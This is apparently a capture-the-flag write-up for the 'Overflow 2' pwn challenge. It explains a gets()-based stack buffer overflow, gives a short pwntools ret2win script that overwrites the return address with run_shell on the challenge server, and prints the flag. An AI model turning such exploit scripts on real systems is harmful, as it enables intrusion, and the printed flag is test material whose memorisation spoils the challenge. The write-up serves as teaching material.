# Overflow 2 - Pwn

We look at the c source file, find a function run_shell that pops a shell. The function vuln creates a 16 character buffer and uses gets to read into it, creating buffer overflow.


We can see in the disassembly this input is at ebp-0x18, and there is no PIE. We can execute a simple ret2win attack, sending 28 bytes and then the address of the run_shell function, overwriting the return address with the run_shell function.


This pops a shell, so we cat flag.txt to get the flag.

#### Flag: CYCTF{0v3rfl0w!ng_v@ri@bl3$_i$_3z}

```py
from pwn import *
NUM_TO_RET = 0x18 + 4
padding = b'A'*NUM_TO_RET
e = ELF("./overflow2")
p = e.process() if args.LOCAL else remote('cyberyoddha.baycyber.net', 10002)
p.sendline(padding + p32(e.symbols['run_shell']))
p.interactive()
```
